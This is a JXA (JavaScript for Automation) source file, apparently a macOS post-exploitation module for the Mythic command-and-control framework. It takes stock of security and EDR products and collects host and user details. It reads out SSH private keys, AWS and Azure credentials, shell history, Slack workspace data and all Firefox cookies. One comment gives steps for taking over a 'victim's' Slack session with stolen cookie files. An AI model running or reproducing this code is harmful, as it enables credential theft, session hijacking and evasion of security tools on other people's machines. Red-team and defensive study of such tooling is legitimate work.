ObjC.import('Cocoa');
ObjC.import('Foundation');
ObjC.import('stdlib');
ObjC.import('sqlite3');
var currentApp = Application.currentApplication();
currentApp.includeStandardAdditions = true;
var fileMan = $.NSFileManager.defaultManager;
var outstring = "";

function Checks(options){

	function TCCCheck(){
		var results = "";
		results += "#######################################\n";
		results += "Full Disk Access Check\n";
		var username = $.NSUserName().js
		try{
			var dbpath = '/Users/' + username + '/Library/Application\ Support/com.apple.TCC/TCC.db'
			var handle = $.NSFileHandle.fileHandleForReadingAtPath(dbpath);
			var size = handle.seekToEndOfFile;
			var conv = this.toString(size);
			if (size == null){
				results += '[-] Terminal has NOT yet been given FDA\n';
				results += "#######################################\n";
				return results
			}
			else {
				results += '[+] Terminal HAS ALREADY been given FDA! Size of the user TCC.db file is ' + size + '\n';
				results += "#######################################\n";
				return results
			}
		}
		catch(error){
				results += error
				results += '\n';
				results += "#######################################\n";
				return results

			}

	}
	////////
	function SecCheck(){
		var results = "";
		var runapps = $.NSWorkspace.sharedWorkspace.runningApplications.js;
		var applist = [];
		for(let i = 0; i < runapps.length; i++){
			let info = {};
			info['name'] = runapps[i].localizedName.js;
			applist.push(info['name']);

		}

		var allapps = applist.toString();
		var b = 0;
		results += "=====>Security Tools Check:\n";
		if ((allapps.includes("CbOsxSensorService")) || (fileMan.fileExistsAtPath("/Applications/CarbonBlack/CbOsxSensorService"))){
			results += "[+] Carbon Black Sensor installed.\n";
			b = 1;
		}

		if ((allapps.includes("CbDefense")) || (fileMan.fileExistsAtPath("/Applications/Confer.app"))){
		        results += "[+] CB Defense A/V installed.\n";
		        b = 1;
		}

		if ((allapps.includes("ESET")) || (allapps.includes("eset")) || (fileMan.fileExistsAtPath("Library/Application Support/com.eset.remoteadministrator.agent"))){
		        results += "[+] ESET A/V installed.\n";
		        b = 1;
		}

		if ((allapps.includes("Littlesnitch")) || (allapps.includes("Snitch")) || (fileMan.fileExistsAtPath("/Library/Little Snitch/"))){
		        results += "[+] Littlesnitch firewall found.\n";
		        b = 1;
		}

		if ((allapps.includes("xagt")) || (fileMan.fileExistsAtPath("/Library/FireEye/xagt"))){
		        results += "[+] FireEye HX agent found.\n";
		        b = 1;
		}

		if ((allapps.includes("falconctl")) || (fileMan.fileExistsAtPath("/Library/CS/falcond"))){
		        results += "[+] Crowdstrike Falcon agent found.\n";
		        b = 1;
		}

		if ((allapps.includes("OpenDNS")) || (allapps.includes("opendns")) || (fileMan.fileExistsAtPath("/Library/Application Support/OpenDNS Roaming Client/dns-updater"))){
		        results += "[+] OpenDNS client found.\n";
		        b = 1;
		}

		if ((allapps.includes("SentinelOne")) || (allapps.includes("sentinelone"))){
		        results += "[+] Sentinel One agent found.\n";
		        b = 1;
		}

		if ((allapps.includes("GlobalProtect")) || (allapps.includes("PanGPS")) || (fileMan.fileExistsAtPath("/Library/Logs/PaloAltoNetworks/GlobalProtect")) || (fileMan.fileExistsAtPath("/Library/PaloAltoNetworks"))){
		        results += "[+] Global Protect PAN VPN client found.\n";
		        b = 1;
		}

		if ((allapps.includes("HostChecker")) || (allapps.includes("pulsesecure")) || (fileMan.fileExistsAtPath("/Applications/Pulse Secure.app")) || (allapps.includes("Pulse-Secure"))){
		        results += "[+] Pulse VPN client found.\n";
		        b = 1;
		}

		if ((allapps.includes("AMP-for-Endpoints")) || (fileMan.fileExistsAtPath("/opt/cisco/amp"))){
		        results += "[+] Cisco AMP for endpoints found.\n";
		        b = 1;
		}

		if ((fileMan.fileExistsAtPath("/usr/local/bin/jamf")) || (fileMan.fileExistsAtPath("/usr/local/jamf"))){
		        results += "[+] JAMF found on this host.\n";
		        b = 1;
		}

		if (fileMan.fileExistsAtPath("/Library/Application Support/Malwarebytes")){
		        results += "[+] Malwarebytes A/V found.\n";
		        b = 1;
		}

		if (fileMan.fileExistsAtPath("/usr/local/bin/osqueryi")){
		        results += "[+] osquery found.\n";
		        b = 1;
		}

		if (fileMan.fileExistsAtPath("/Library/Sophos Anti-Virus/")){
		        results += "[+] Sophos A/V found.\n";
		        b = 1;
		}

		if ((allapps.includes("lulu")) || (fileMan.fileExistsAtPath("/Library/Objective-See/Lulu")) || (fileMan.fileExistsAtPath("/Applications/LuLu.app"))){
		        results += "[+] LuLu firewall found.\n";
		        b = 1;
		}

		if ((allapps.includes("dnd")) || (fileMan.fileExistsAtPath("/Library/Objective-See/DND")) || (fileMan.fileExistsAtPath("/Applications/Do Not Disturb.app/"))){
		        results += "[+] LuLu firewall found.\n";
		        b = 1;
		}

		if ((allapps.includes("WhatsYourSign")) || (fileMan.fileExistsAtPath("/Applications/WhatsYourSign.app"))){
		        results += "[+] Whats Your Sign code signature info tool found.\n";
		        b = 1;
		}

		if ((allapps.includes("KnockKnock")) || (fileMan.fileExistsAtPath("/Applications/KnockKnock.app"))){
		        results += "[+] Knock Knock persistence detection tool found.\n";
		        b = 1;
		}

		if ((allapps.includes("reikey")) || (fileMan.fileExistsAtPath("/Applications/ReiKey.app"))){
		        results += "[+] ReiKey keyboard event taps detection tool found.\n";
		        b = 1;
		}

		if ((allapps.includes("OverSight")) || (fileMan.fileExistsAtPath("/Applications/OverSight.app"))){
		        results += "[+] OverSight microphone and camera monitoring tool found.\n";
		        b = 1;
		}

		if ((allapps.includes("KextViewr")) || (fileMan.fileExistsAtPath("/Applications/KextViewr.app"))){
		        results += "[+] KextViewr kernel module detection tool found.\n";
		        b = 1;
		}

		if ((allapps.includes("blockblock")) || (fileMan.fileExistsAtPath("/Applications/BlockBlock Helper.app"))){
		        results += "[+] Block Block persistence location monitoring tool found.\n";
		        b = 1;
		}

		if ((allapps.includes("Netiquette")) || (fileMan.fileExistsAtPath("/Applications/Netiquette.app"))){
		        results += "[+] Netiquette network monitoring tool found.\n";
		        b = 1;
		}

		if ((allapps.includes("processmonitor")) || (fileMan.fileExistsAtPath("/Applications/ProcessMonitor.app"))){
		        results += "[+] Objective See Process Monitor tool found.\n";
		        b = 1;
		}

		if ((allapps.includes("filemonitor")) || (fileMan.fileExistsAtPath("/Applications/FileMonitor.app"))){
		        results += "[+] Objective See File Monitor tool found.\n";
		        b = 1;
		}

		if (b == 0){
			results += "[-] No security products found.";
		}

		results += "#######################################\n";
		return results

	}
	//////////////////

	function SysInfo(){
		var results = "";
		results += "=====>System Info Check:\n";

		try {

		var curruser = currentApp.systemInfo().shortUserName;
		results += "[+] Current username: " + curruser + "\n\n";
		var machinename = ObjC.deepUnwrap($.NSHost.currentHost.localizedName);
		results += "[+] Hostname: " + machinename + "\n\n";

		localusers = ObjC.deepUnwrap(fileMan.contentsOfDirectoryAtPathError('/Users', $()));
		results += "[+] Local user accounts:\n";
		for (k = 0; k < localusers.length; k++){
			results += localusers[k];
			results += "\n";
		}

		results += "\n";
		var addresses = ObjC.deepUnwrap($.NSHost.currentHost.addresses);
		results += "[+] Local IP Addresses:\n";
		for (i = 0; i < addresses.length; i++){
			results += addresses[i];
			results += "\n";
		}

		var plistpath = '/Users/' + curruser + '/Library/Preferences/com.apple.LaunchServices/com.apple.launchservices.secure.plist';
		var canary = 0;

if (fileMan.fileExistsAtPath(plistpath)){
        results += "\n===>Default browser:\n";
        let dict = $.NSMutableDictionary.alloc.initWithContentsOfFile(plistpath);
        let contents = ObjC.deepUnwrap(dict);

        if(contents != undefined){
                for(let i = 0; i < contents['LSHandlers'].length; i++){
                        if(contents['LSHandlers'][i].hasOwnProperty('LSHandlerRoleAll')){
                                var x = String(contents['LSHandlers'][i]['LSHandlerURLScheme']);
                                if(x.includes("http")){
                                        results += contents['LSHandlers'][i]['LSHandlerRoleAll'];
																				results += "\n";
                                        canary += 1;
                                }
                        }
                }
                if(canary == 0){
                        results += "[-] No LSHanderURLScheme value found for http/https, so default browser is likely Safari\n";
                }
        }

}




		results += "#######################################\n";
	}
	catch(err){
		results += err;
	}
	return results
	}
	///////////////////

	function CredSearch(){
		var results = "";
		var curruser = currentApp.systemInfo().shortUserName;
		var sshpath = "/Users/" + curruser + "/.ssh";
		if (fileMan.fileExistsAtPath(sshpath)){
			results += "\n[+] Local SSH cred search:\n";
			let enumerator = ObjC.deepUnwrap((fileMan.enumeratorAtPath(sshpath)).allObjects);
			try{
				for (p = 0; p < enumerator.length; p++){
					results += enumerator[p] + ":" + "\n";
					fullpath = sshpath + "/" + enumerator[p];
					var filedata = $.NSString.stringWithContentsOfFileEncodingError(fullpath,$.NSUTF8StringEncoding, $()).js;
					results += filedata;
					results += "\n";

				}
			}
			catch(err){
				results += err;
			}

		}

		//aws
		var awspath = "/Users/" + curruser + "/.aws";
		if (fileMan.fileExistsAtPath(awspath)){
		        results += "\n[+] Local aws cred search:\n";
		        let enumerator = ObjC.deepUnwrap((fileMan.enumeratorAtPath(awspath)).allObjects);
		        try{
		                for (p = 0; p < enumerator.length; p++){
		                        results += enumerator[p] + ":" + "\n";
		                        fullpath = awspath + "/" + enumerator[p];
		                        var filedata = $.NSString.stringWithContentsOfFileEncodingError(fullpath,$.NSUTF8StringEncoding, $()).js;
		                        results += filedata;
		                        results += "\n";

		                }
		        }
		        catch(err){
		                results += err;
		        }

		}


		//azure
		var azpath = "/Users/" + curruser + "/.azure";
		var azpath2 = "/Users/" + curruser + "/.azure" + "/azureProfile.json";

		if (fileMan.fileExistsAtPath(azpath)){
			try{
		        results += "\n[+] Local azure cred search:\n";
			results += "[azureProfile.json]";
			results += "\n";
			var contents = $.NSString.stringWithContentsOfFileEncodingError(azpath2,$.NSUTF8StringEncoding, $()).js;
			results += contents;
			results += "\n";
			}
			catch(err){
				results += err;
				results += "\n";
			}

		}

		results += "#######################################\n";
		return results
	}
	///////////////

	function RunningApps(){
		var results = "";
		results += "=====>Running Apps:\n";
		try{
		var appsinfo = $.NSWorkspace.sharedWorkspace.runningApplications.js;
		var appsinfo2 = [];
		for(let i = 0; i < appsinfo.length; i++){
		        let info = {};
		        results += (i+1) + ". " + appsinfo[i].localizedName.js;
			results += "\n";

		}
		} catch(err){
			results += err;
			results += "\n";
		}
		results += "#######################################\n";
		return results
	}
	///////////////

	function History(){
		var results = "";
		var curruser = currentApp.systemInfo().shortUserName;
		var zpath = ("/Users/" + curruser + "/.zsh_history");

		if (fileMan.fileExistsAtPath(zpath)){
		        try{
		        results += "\n[+] Local zsh history search:\n";
		        results += "[.zsh_history]";
		        results += "\n";
						var contents =$.NSString.stringWithContentsOfFileEncodingError(zpath,$.NSUTF8StringEncoding, $()).js;
		        results += contents;
		        results += "\n";

		        }
		        catch(err){
		                results += err;
		                results += "\n";
		        }

		}

		results += "#######################################\n";
		return results
	}
	////////////////

	function SlackSearch(){
		var results = "";
		var curruser = currentApp.systemInfo().shortUserName;
		var sdPath = "/Users/" + curruser + "/Library/Application Support/Slack/storage/slack-downloads";
		var swPath = "/Users/" + curruser + "/Library/Application Support/Slack/storage/slack-workspaces";
		var canary = 0;

		if (fileMan.fileExistsAtPath(sdPath)){
			canary = canary + 1;
		        try{
		        results += "\n[+] Slack downloads data search:\n";
		        results += "[slack-downloads]";
		        results += "\n";
		        var contents = $.NSString.stringWithContentsOfFileEncodingError(sdPath,$.NSUTF8StringEncoding, $()).js;
			var contents2 = String(contents);
			var contents3 = contents2.split(",");
			for(q = 0; q < contents3.length; q++){
				if(contents3[q].includes("http")){
					results += "==> " + contents3[q] + "\n";
				}
			}
		        }
		        catch(err){
		                results += err;
		                results += "\n";
		        }

		}


		if (fileMan.fileExistsAtPath(swPath)){
			canary = canary + 1;
		        try{
		        results += "\n[+] Slack workspaces data search:\n";
		        results += "[slack workspaces]";
		        results += "\n";
		        var contents = $.NSString.stringWithContentsOfFileEncodingError(swPath,$.NSUTF8StringEncoding, $()).js;
			var contents2 = String(contents);
			var contents3 = contents2.split(",");
			for(q = 0; q < contents3.length; q++){
				if(contents3[q].includes("domain")){
				results += "==> " + contents3[q] + "\n";
				}
				if(contents3[q].includes("name")){
				results += contents3[q] + "\n";
				}
			}

			results += "\nSteps from Cody's article to load the Slack files found:\n1. Pull the slack-workspaces and Cookies files from the host.\n2. Install a new instance of slack (but don’t sign in to anything)\n3. Close Slack and replace the automatically created Slack/storage/slack-workspaces and Slack/Cookies files with the two you downloaded from the victim\n4. Start Slack";

			}
		        catch(err){
		                results += err;
		                results += "\n";
		        }



		}

		if (canary == 0) {
			results += "#######################################\n[-] Slack not found on this host\n";
		}

		results += "#######################################\n";
		return results
	}
	/////////////////////

	function InstalledApps(){
		var results = "";
		var fileMan = $.NSFileManager.defaultManager;
		var err;
		var username = $.NSUserName().js
		var ipath = '/private/var/db/receipts';
		if (fileMan.fileExistsAtPath(ipath)){
		        results += "\n[+] Info on installers and apps:\n";
		        let items = ObjC.deepUnwrap(fileMan.contentsOfDirectoryAtPathError(ipath,$()));
		        try{
		                for (p=0; p < items.length; p++){
		                        results += items[p] + '\n';

		                }



		        }

		catch(err){
		        results += err;
		}
		results += "#######################################\n";

		return results
		}
	}
	/////////////////////
	function LockCheck(){
		var results = "";

		try {

		var script = `
		#!/bin/bash
		p=$(ioreg -n Root -d1 -a | grep CGSSession)
		if [[ "$p" == *"CGSSessionScreenIsLocked"* ]]; then
		        echo "[+] Screen is currently LOCKED"
		else
		        echo "[-] Screen is currently UNLOCKED"
		fi`

		var p = currentApp.doShellScript(script);

		results += p;
		results += "\n#######################################\n";
		return results

		} catch (error){
				results += "\n#######################################\n";
		        return error;
		}


return results

	}


	function FirefoxCookies(){
		var results = "";
		var fileMan = $.NSFileManager.defaultManager;
		var err;
		var username = $.NSUserName().js
		var ffoxpath = '/Users/' + username + '/Library/Application\ Support/Firefox/Profiles';
		if (fileMan.fileExistsAtPath(ffoxpath)){
			results += "\n[+] Firefox cookies.sqlite:\n";
			let prof_folders = ObjC.deepUnwrap(fileMan.contentsOfDirectoryAtPathError(ffoxpath,$()));
			try{
				for (p=0; p< prof_folders.length; p++){
					if ((prof_folders[p]).includes('-release')){
						var changeto = ffoxpath + "/" + prof_folders[p];
						var dircontents = ObjC.deepUnwrap(fileMan.contentsOfDirectoryAtPathError(changeto,$()));
						for (n=0; n<dircontents.length; n++){
							if (dircontents[n] == 'cookies.sqlite'){
								var ckpath = changeto + "/" + dircontents[n];
								var ppDb = Ref();
								var err = $.sqlite3_open(ckpath, ppDb)
								var db = ppDb[0]
								if(err != $.SQLITE_OK) throw new Error($.sqlite3_errmsg(db))
								var sql = 'select name,value,host,path,datetime(expiry,\'unixepoch\') as expiredate,isSecure,isHttpOnly,sameSite from moz_cookies'
								var ppStmt = Ref()
								var err = $.sqlite3_prepare(db, sql, -1, ppStmt, Ref())
								if(err != $.SQLITE_OK) throw new Error($.sqlite3_errmsg(db))
								pStmt = ppStmt[0]
								try{
									results += 'FORMAT: cookie name | cookie value | host | path | expire date | isSecure | isHttpOnly | sameSite\n';
									results += '___________________________________________________________________________________________________\n';
									while((err = $.sqlite3_step(pStmt)) == $.SQLITE_ROW){
										results += $.sqlite3_column_text(pStmt,0) + " | " + $.sqlite3_column_text(pStmt,1) + " | " + $.sqlite3_column_text(pStmt,2) + " | " + $.sqlite3_column_text(pStmt,3) + " | " + $.sqlite3_column_text(pStmt,4) + " | " + $.sqlite3_column_text(pStmt,5) + " | " + $.sqlite3_column_text(pStmt,6) + " | " + $.sqlite3_column_text(pStmt,7) + " | \n"
									}
									results += '#####################################################################################################\n';
									return results
								}
								catch(error){
									results += error.toString()
									return results

								}

							}



						}



					}
				}
			}

		catch(err){
		}
		results += "#######################################\n";
		console.log(results)
		return results
		}
	}

	///////////////////////



if (options == "All"){
	var1 = TCCCheck();
	outstring += var1;

	var2 = SecCheck();
	outstring += var2;

	var3 = SysInfo();
	outstring += var3;

	var4 = CredSearch();
	outstring += var4;

	var5 = RunningApps();
	outstring += var5;

	var6 = History();
	outstring += var6;

	var7 = SlackSearch();
	outstring += var7;

	var8 = SlackSearch();
	outstring += var8;

	var9 = FirefoxCookies();
	outstring += var9;

}
else {

	if (options.includes("TCCCheck")){
		var1 = TCCCheck();
		outstring += var1;
	}

	if (options.includes("LockCheck")){
		var10 = LockCheck();
		outstring += var10;
	}

	if (options.includes('SecCheck')){
		var2 = SecCheck();
		outstring += var2;
	}

	if (options.includes("SysInfo")){
		var3 = SysInfo();
		outstring += var3;
	}


	if (options.includes("CredSearch")){
		var4 = CredSearch();
		outstring += var4;
	}

	if (options.includes("RunningApps")){
		var5 = RunningApps();
		outstring += var5;
	}

	if (options.includes("History")){
		var6 = History();
		outstring += var6;
	}

	if (options.includes("SlackSearch")){
		var7 = SlackSearch();
		outstring += var7;
	}

	if (options.includes("InstalledApps")){
		var8 = SlackSearch();
		outstring += var8;
	}

	if (options.includes("FirefoxCookies")){
		var9 = FirefoxCookies();
		outstring += var9;
	}

}


	return outstring


}


//Checks('All')

//Mythic usage:
//jsimport SwiftBelt-JXA.js
//jsimport_call Checks('function1,function2,function3...')
//ex: jsimport_call Checks('SysInfo,RunningApps,TCCCheck')

//list of all functions:
//TCCCheck
//SecCheck
//SysInfo
//CredSearch
//RunningApps
//History
//SlackSearch
//InstalledApps
//FirefoxCookies
//LockCheck
